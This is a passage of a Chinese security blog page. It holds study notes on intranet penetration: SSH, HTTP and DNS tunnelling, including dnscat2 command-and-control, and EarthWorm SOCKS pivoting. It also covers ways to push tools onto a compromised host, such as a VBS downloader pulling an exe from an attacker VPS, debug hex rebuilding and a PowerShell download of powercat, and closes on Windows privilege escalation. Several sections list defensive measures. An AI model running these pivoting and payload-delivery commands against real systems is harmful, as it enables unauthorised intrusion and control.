+<p>将靶机端口数据转发到vps对应的端口上，之后可以通过访问vps的对应端口以访问靶机的对应端口。</p>
+<h4 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h4><p>环境：VPS不能访问内网机器，但内网可以访问外网。</p>
+<p>以Web服务器为跳板，将VPS的3307端口流量转发到内网服务器的3389端口：</p>
+<p>在**Web服务器(跳板机)**上执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R &lt;vps端口&gt;:&lt;靶机ip&gt;:&lt;靶机端口&gt; root@&lt;vpsIP地址&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时即可访问VPS的3307端口就能连接内网主机的3389。</p>
+<blockquote>
+<p>与本地转发的区别：本地转发是VPS连接Web，远程转发是Web连接VPS。（转发的部分都是内网机器转发到web，因此中间转发的命令没有变化，都是3307:10.0.0.1:3389，变化的只有后面连接的IP）</p>
+</blockquote>
+<h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><p>环境：VPS可以访问其中一台内网机器。</p>
+<p>VPS执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D &lt;端口&gt; root@&lt;跳板机ip&gt;</span><br></pre></td></tr></table></figure>
+
+<p>建立动态Socks4&#x2F;5代理通道。</p>
+<p>浏览器设置代理为本机的指定端口，即可在浏览器中访问靶机</p>
+<h4 id="防范思路"><a href="#防范思路" class="headerlink" title="防范思路"></a>防范思路</h4><ul>
+<li>SSH隧道之所以能被攻击者利用，主要是因为系统访问控制措施不够。 </li>
+<li>在系统中配置SSH远程管理<em>白名单</em> </li>
+<li>在ACL中限制只有<strong>特定的IP地址</strong>才能连接SSH </li>
+<li>设置系统完全使用带外管理</li>
+</ul>
+<h3 id="HTTP-x2F-HTTPS"><a href="#HTTP-x2F-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h3><p>HTTP隧道可以将所有流量转发到内网。</p>
+<p>常用工具主要有reGeorg, metepreter, tunna。</p>
+<p>使用如下指令建立HTTP隧道：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reGeorgSocksProxy.py -u http://host/tunnel.jsp -p 9999</span><br></pre></td></tr></table></figure>
+
+<p>再配置proxychains等代理工具即可实现访问目标内网的资源。</p>
+<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>将数据封装进DNS协议实现通信，需要架设一个伪装的DNS服务器。</p>
+<p>使用DNS隧道时，因为内网网关没有转发IP数据包，看起来没有与外网通信，实际上内网DNS服务器做了中转。</p>
+<h4 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h4><p>概念：一款使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份认证的开源软件 </p>
+<p>是一个命令与控制(C&amp;C)工具，客户端采用C,服务端采用Ruby</p>
+<p>C&amp;C通信是指植入C&amp;C木马的客户端与C&amp;C服务端(攻击者)上的远控程序的通信。</p>
+<p>两种模式：</p>
+<ol>
+<li>直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求；</li>
+<li>中继模式：DNS经过互联网的迭代解析，最终指向指定DNS服务器。</li>
+</ol>
+<p>特点：</p>
+<ul>
+<li>支持多个会话 </li>
+<li>流量加密 </li>
+<li>使用密钥防止MiTM攻击 </li>
+<li>在内存中直接执行PowerShell脚本 </li>
+<li>隐蔽通信</li>
+</ul>
+<p>服务器端启动：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby ./dnscat2.rb vpn.***.*** -e open -c &lt;密码&gt; --no-caceh</span><br></pre></td></tr></table></figure>
+
+<p>直连模式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ruby ./dnscat2.rb --dns server=127.0.0.1,port=533,<span class="built_in">type</span>=TXT --secret=&lt;密码&gt;</span><br></pre></td></tr></table></figure>
+
+<p>客户端连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat2-v***-client-win32.exe --dns domain=vpn.****.*** --secret &lt;密码&gt;</span><br></pre></td></tr></table></figure>
+
+<p>连接之后也可以反弹shell或者执行类似MSF的指令。</p>
+<p>防范方式：</p>
+<ul>
+<li>禁止网络中的任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信</li>
+<li>将邮件服务器&#x2F;网关列入白名单并阻止传入和传出流量中的TXT请求</li>
+<li>跟踪用户的<em>DNS査询次数</em>。如果达到阈值，就生成相应的报告</li>
+<li>阻止<em>ICMP</em>。</li>
+</ul>
+<h2 id="SOCKS5代理"><a href="#SOCKS5代理" class="headerlink" title="SOCKS5代理"></a>SOCKS5代理</h2><p>常用的有三种网络环境：</p>
+<ol>
+<li>服务器在内网，可以访问任意外网</li>
+<li>服务器在内网，可以访问外网，但部署了防火墙做过滤</li>
+<li>服务器在内网，且开放了部分端口，且服务器不能访问外网</li>
+</ol>
+<p>对于第三种，常需要用代理实现访问。</p>
+<p>SockS协议分为SOCKS4和SOCKS5两种类型。</p>
+<p>特点：</p>
+<ul>
+<li>SOCK4只支持TCP协议 </li>
+<li>SOCK5支持TCP&#x2F;UDP协议以及各种身份验证机制 </li>
+<li>标准端口为1080 </li>
+<li>能够直接与靶机进行通信，避免多次端口转发</li>
+</ul>
+<p>SOCKS代理可以理解为强化版的lcx端口转发，工具在服务器端监听端口，当有理解请求时，从SOCKS协议中解析出目标URL和端口，再执行lcx具体功能。</p>
+<p>常用工具：EarthWorm，reGeorg，sSocks，SocksCap64</p>
+<h3 id="EarthWorm"><a href="#EarthWorm" class="headerlink" title="EarthWorm"></a>EarthWorm</h3><p>正向代理与反向代理：</p>
+<ul>
+<li>正向是主动通过代理来访问目标机器；</li>
+<li>反向是目标机器通过代理进行主动连接。</li>
+</ul>
+<h4 id="正向Socks5代理"><a href="#正向Socks5代理" class="headerlink" title="正向Socks5代理"></a>正向Socks5代理</h4><p>目标机器有公网IP时，直接在目标主机监听端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 888</span><br></pre></td></tr></table></figure>
+
+<p>此时在888端口架设了Socks代理，再配置即可使用这个代理。</p>
+<h4 id="反弹Socks5服务器"><a href="#反弹Socks5服务器" class="headerlink" title="反弹Socks5服务器"></a>反弹Socks5服务器</h4><p>目标没有公网IP时。</p>
+<p>向在VPS上执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 1008 -e 888</span><br></pre></td></tr></table></figure>
+
+<p>此时在VPS上添加了一个<em>转接隧道</em>，把对1080端口收到的代理请求转发到888端口。</p>
+<p>然后在暴露在外网的内网Web服务器上执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rssocks -d &lt;VPS-IP&gt; -e 888</span><br></pre></td></tr></table></figure>
+
+<p>此时在该Web服务器上启动了Socks5代理服务，然后<strong>反弹到VPS的888端口</strong>。</p>
+<p>再返回到VPS即可看到反弹成功，即可通过访问VPS的1008端口使用内网Web服务器上搭建的Socks5代理。</p>
+<h4 id="二级网络环境"><a href="#二级网络环境" class="headerlink" title="二级网络环境"></a>二级网络环境</h4><p>a）</p>
+<p>环境：获得了两个主机A，B的权限，其中A有公网地址，B在内网 </p>
+<p>处理： </p>
+<p>B主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 888</span><br></pre></td></tr></table></figure>
+
+<p>A主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_tran -l 1088 -f -g 888</span><br></pre></td></tr></table></figure>
+
+<p>此时可以通过访问A主机的1088使用内网B主机的888端口代理。</p>
+<p>b） </p>
+<p>环境：获得了两个主机A，B的权限，其中A没有公网地址，B在内网 </p>
+<p>处理： </p>
+<p>VPS:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l &lt;接收端口&gt; -e &lt;转发端口1&gt; </span><br></pre></td></tr></table></figure>
+
+<p>B主机（与上面环境相同）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l &lt;转发端口2&gt;</span><br></pre></td></tr></table></figure>
+
+<p>A主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_slave -d  -e &lt;转发端口1&gt; -f  -g &lt;转发端口2&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将vps的转发端口1通过A主机与B主机的转发端口2相连，访问vps的接收端口即可使用B主机的代理访问内网资源。</p>
+<h3 id="Proxychains"><a href="#Proxychains" class="headerlink" title="Proxychains"></a>Proxychains</h3><p>配置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>删除dynamic前的#，将文件末的ip与端口改成想要访问端口的信息即可</p>
+<p>代理启动浏览器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains firefox</span><br></pre></td></tr></table></figure>
+
+<h2 id="上传下载"><a href="#上传下载" class="headerlink" title="上传下载"></a>上传下载</h2><p>命令行环境上传下载工具：</p>
+<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>最常用的文件上传下载协议。</p>
+<p>常用命令：</p>
+<ul>
+<li>open &lt;服务器IP&gt;：连接服务器</li>
+<li>cd &lt;目录名&gt;：进入目录</li>
+<li>type：查看当前传输方式（默认为ASCII传输）</li>
+<li>put &lt;filename&gt;：文件上传</li>
+<li>send &lt;filename&gt;：上传</li>
+<li>get &lt;filename&gt;：文件下载</li>
+</ul>
+<h3 id="利用VBS脚本上传"><a href="#利用VBS脚本上传" class="headerlink" title="利用VBS脚本上传"></a>利用VBS脚本上传</h3><p>使用<code>msxm12.xmlhttp</code>和<code>adodb.stream</code>对象编写脚本。</p>
+<p>首先上传文件到VPS，且暴露到外网URL:<a target="_blank" rel="noopener" href="http://server_ip/target.exe">http://server_ip/target.exe</a></p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> Post = <span class="built_in">CreateObject</span>(<span class="string">&quot;Msxm12.XMLHTTP&quot;</span>);</span><br><span class="line"><span class="keyword">Set</span> Shell = <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>);</span><br><span class="line">Post.Open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://server_ip/target.exe&quot;</span>,<span class="number">0</span></span><br><span class="line">Post.Send()</span><br><span class="line"><span class="keyword">Set</span> aGet = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Stream&quot;</span>);</span><br><span class="line">aGet.Mode = <span class="number">3</span></span><br><span class="line">aGet.Type = <span class="number">1</span></span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile <span class="string">&quot;C:\test\target.exe&quot;</span>,<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>可以使用命令行的<code>echo</code>命令将上面的脚本一行一行重定向到<code>download.vbs</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> Set Post = CreateObject(<span class="string">&quot;Msxm12.XMLHTTP&quot;</span>) &gt;&gt; download.vbs</span><br></pre></td></tr></table></figure>
+
+<p>执行脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cscript .\download.vbs</span><br></pre></td></tr></table></figure>
+
+<p>即可在目标服务器从我们的VPS下载target.exe（即实现了target.exe的上传）。</p>
+<h3 id="利用Debug上传"><a href="#利用Debug上传" class="headerlink" title="利用Debug上传"></a>利用Debug上传</h3><p>原理：先将需要上传的EXE文件转为纯十六进制文本格式，再通过echo命令将hex代码写入目标机器的文件中，最后再利用Debug命令<em>将hex代码编译还原为EXE可执行文件</em>。</p>
+<p>exe转hex可以使用<code>exe2bat.exe</code>工具，该工具位于kali的<code>/usr/share/windows-binaries</code>目录：</p>
+<p><img src="/../images/image-20240610215542250.png" alt="image-20240610215542250"></p>
+<p>运行命令转换（但该工具只能转换64KB以下大小的文件）：</p>
+<p><img src="/../images/image-20240610220604143.png" alt="image-20240610220604143"></p>
+<p>得到的数据类似于：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  &gt;&gt;123.hex </span><br><span class="line"><span class="built_in">echo</span> e 1080 &gt;&gt;123.hex</span><br><span class="line"><span class="built_in">echo</span> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  &gt;&gt;123.hex </span><br><span class="line"><span class="built_in">echo</span> e 1100 &gt;&gt;123.hex</span><br><span class="line"><span class="built_in">echo</span>  &gt;&gt;123.hex </span><br><span class="line"><span class="built_in">echo</span> r cx &gt;&gt;123.hex</span><br><span class="line"><span class="built_in">echo</span> 1000 &gt;&gt;123.hex</span><br><span class="line"><span class="built_in">echo</span> w &gt;&gt;123.hex</span><br><span class="line"><span class="built_in">echo</span> q &gt;&gt;123.hex</span><br><span class="line">debug&lt;123.hex</span><br><span class="line">copy 1.dll XP3Viewer.exe</span><br></pre></td></tr></table></figure>
+
+<p>复制到目标命令行执行，实际上是将大部分数据和指令<em>重定向</em>到debug执行。</p>
+<p>最后把debug生成的动态链接库1.dll写到exe文件，即可还原为可执行的exe文件：</p>
+<p><img src="/../images/image-20240610235011138.png" alt="image-20240610235011138"></p>
+<p>注意：在64位的Windows10上一般没有Debug命令了。</p>
+<h3 id="使用Nishang上传"><a href="#使用Nishang上传" class="headerlink" title="使用Nishang上传"></a>使用Nishang上传</h3><p>原理与上面的debug类似。</p>
+<p>实际上也是先将exe转为txt，再echo到目标服务器，最后用Nishang的Download_Execute脚本将文本文件转换为可执行程序:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Download_Execute url/msf.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="使用bitsadmin下载"><a href="#使用bitsadmin下载" class="headerlink" title="使用bitsadmin下载"></a>使用bitsadmin下载</h3><p>bitsadmin是Windows XP之后系统自带的命令行工具，Windows Update就是用它来下载文件的。</p>
+<h3 id="利用Powershell下载"><a href="#利用Powershell下载" class="headerlink" title="利用Powershell下载"></a>利用Powershell下载</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>, <span class="string">&#x27;powercat.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="第四章-权限提升分析及防御"><a href="#第四章-权限提升分析及防御" class="headerlink" title="第四章 权限提升分析及防御"></a>第四章 权限提升分析及防御</h1><p>四种权限与其对应的功能：</p>
+<ol>
+<li>User：普通用户权限，是系统中最安全的权限（因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料)。 </li>
+<li>Administrator：管理员权限。如果没有管理员权限，就无法进行获取散列值、安装软件、修改防火墙规则、修改注册表等操作. </li>
+<li>System：系统权限。可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作。 </li>
+<li>TrustedInstaller：Windows中的<strong>最高权限</strong>。对系统文件，即使拥有System权限也无法进行修改。只有拥有TrustedInstaller权限的用户才可以修改系统文件。</li>
+</ol>
+<p>两种提取：</p>
+<ul>
+<li>横向：获取同级别角色的权限；</li>
+<li>纵向：低权限角色获取高权限角色的权限</li>
+</ul>
+<h2 id="系统内核溢出漏洞提权分析以及防范"><a href="#系统内核溢出漏洞提权分析以及防范" class="headerlink" title="系统内核溢出漏洞提权分析以及防范"></a>系统内核溢出漏洞提权分析以及防范</h2><h3 id="手动发现缺失补丁"><a href="#手动发现缺失补丁" class="headerlink" title="手动发现缺失补丁"></a>手动发现缺失补丁</h3><p>使用whoami查看当前权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> /groups</span><br></pre></td></tr></table></figure>
+
+<p>查看补丁：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+
+<p>寻找该系统的<a target="_blank" rel="noopener" href="https://github.com/safesword/WindowsExp">提取EXP</a>，再将已安装的补丁与提取EXP对比，使用没有安装补丁的EXP进行提权。</p>
+<h3 id="使用工具寻找缺失补丁"><a href="#使用工具寻找缺失补丁" class="headerlink" title="使用工具寻找缺失补丁"></a>使用工具寻找缺失补丁</h3><ul>
+<li>Metasploit的post&#x2F;windows&#x2F;gather&#x2F;enum_patches模块</li>
+<li>Windows Exploit Suggester</li>
+<li>Powershell的Sherlock脚本</li>
+</ul>
+<h2 id="Windows操作系统配置错误利用分析及防范"><a href="#Windows操作系统配置错误利用分析及防范" class="headerlink" title="Windows操作系统配置错误利用分析及防范"></a>Windows操作系统配置错误利用分析及防范</h2><p>服务特点：</p>
+<ul>
+<li>Windows系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件 </li>
+<li>Windows服务以System权限运行，因此其文件夹，文件和注册表键值都是受强访问机制保护的</li>
+</ul>
+<p>但也有某些服务未得到有效访问保护，系统访问权限配置错误&#x2F;可写目录漏洞主要有两种：</p>
+<ol>
+<li>服务未运行：攻击者用任意服务替换原本服务，再重启</li>
+<li>服务正在运行且无法被终止：利用DLL劫持再尝试重启服务提权</li>
+</ol>
+<p>利用工具：</p>
+<ul>
+<li><p>Powerup：powershell中的脚本 </p>
+</li>
+<li><p>Metasploit：利用service_permissions模块</p>
+</li>
+</ul>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2024/06/08/Analysis-of-CVE-2024-4577/"
+      title="古老漏洞的复活：php-cgi命令注入(CVE-2024-4577)漏洞分析"
+     >
+
+    <p class="title-text">
+      
+        古老漏洞的复活：php-cgi命令注入(CVE-2024-4577)漏洞分析
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <div id="comment-card" class="comment-card">
+    <div class="main-title-bar">
+      <div class="main-title-dot"></div>
+      <div class="main-title">留言 </div>
+    </div>
+    <div id="vcomments"></div>
+  </div>
+  <script>
+      new Valine({
+          el: '#vcomments',
+          appId: "j9YBSIHTlRyfuvPQqY50ARfV-gzGzoHsz",
+          appKey: "Q7s9zRzne9zaSVrroDR2wgO8"
+      })
+  </script>
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2024 Kizureina<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
+        <span class="material-symbols-rounded">keyboard_arrow_up</span>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.style.opacity = 1;
+        } else {
+            btn.style.opacity = 0;
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
